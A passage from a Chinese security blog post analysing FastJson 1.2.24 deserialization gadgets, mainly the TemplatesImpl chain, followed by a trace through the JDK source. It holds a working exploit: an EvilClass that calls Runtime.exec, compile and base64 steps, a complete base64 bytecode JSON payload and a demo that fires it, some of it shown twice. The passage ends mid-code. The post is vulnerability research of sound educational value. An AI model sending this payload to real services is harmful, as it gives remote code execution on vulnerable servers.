-&gt; ObjectDeserializer -&gt; JdbcRowSetImpl -&gt; setAutoCommit() -&gt; connect() -&gt; getDataSourceName()<br></code></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>默认关闭 <code>autotype（&quot;autoTypeSupport&quot;: false）</code>，必须显式开启</p><p>增强<code>checkAutoType</code></p><p>黑名单禁用<code>**JdbcRowSetImpl**</code></p><h2 id="FastJson-1-2-24-的一些其他Gadgets"><a href="#FastJson-1-2-24-的一些其他Gadgets" class="headerlink" title="FastJson 1.2.24 的一些其他Gadgets"></a>FastJson 1.2.24 的一些其他Gadgets</h2><h3 id="TemplatesImpl-不出网可用"><a href="#TemplatesImpl-不出网可用" class="headerlink" title="TemplatesImpl 不出网可用"></a>TemplatesImpl 不出网可用</h3><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilClass</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译并将字节码转为base64</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">javac .\EvilClass.java<br>python -c <span class="hljs-string">&quot;import base64; print(base64.b64encode(open(&#x27;EvilClass.class&#x27;,&#x27;rb&#x27;).read()).decode())&quot;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 替换为你的正确恶意类字节码(Base64编码)</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">byteCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>;<br><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + byteCode + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;EvilClass\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_tfactory\&quot;:&#123;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;<br><br>        System.out.println(payload);<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745823465662-11dd9bfd-5ea7-4d5b-b1f4-d78b554139ad.png"></p><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>要用到<code>TemplatesImpl</code>的非<code>public</code>属性:<code>outputProperties</code>和<code>_bytecodes</code>由<code>private</code>修饰，<code>Fastjson</code>默认只会反序列化<code>public</code>修饰的属性。</p><p>需要设置<code>Feature.SupportNonPublicField(支持反序列化时使用非public修饰符的属性)</code></p><p>即需要调用<code>parseObject()</code>或者<code>parse()</code>时需要带上参数<code>Feature.SupportNonPublicField</code>才能利用这个gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)<br>JSON.parse(text1,Feature.SupportNonPublicField)<br></code></pre></td></tr></table></figure><p>恶意类,必须继承<code>AbstractTranslet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilClass</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 替换为你的正确恶意类字节码(Base64编码)</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">byteCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>;<br><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + byteCode + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;EvilClass\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_tfactory\&quot;:&#123;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;<br><br>        System.out.println(payload);<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下<code>TemplatesImpl</code>是怎么触发的</p><p><code>C:\Program Files\Java\jdk1.8.0_101\src.zip!\com\sun\org\apache\xalan\internal\xsltc\trax\TemplatesImpl.java</code></p><p>找<code>_bytecodes``_name``_tfactor``_outputProperties</code></p><p>因为触发链子的起点肯定在<code>setter</code>或者<code>getter</code>方法，找以上属性的该方法</p><p>在<code>getOutputProperties()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了<code>newTransformer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>&#123;<br>    TransformerImpl transformer;<br><br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>        _indentNumber, _tfactory);<br><br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>        transformer.setURIResolver(_uriResolver);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>        transformer.setSecureProcessing(<span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> transformer;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后会调用<code>getTransletInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>        <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>        <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>        <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        translet.postInitialization();<br>        translet.setTemplates(<span class="hljs-built_in">this</span>);<br>        translet.setServicesMechnism(_useServicesMechanism);<br>        translet.setAllowedProtocols(_accessExternalStylesheet);<br>        <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>            translet.setAuxiliaryClasses(_auxClasses);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> translet;<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会检查<code>if (_name == null)</code>所以<code>_name</code>字段不能为空</p><p>然后会调用<code>**defineTransletClasses()**</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125;<br><br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span 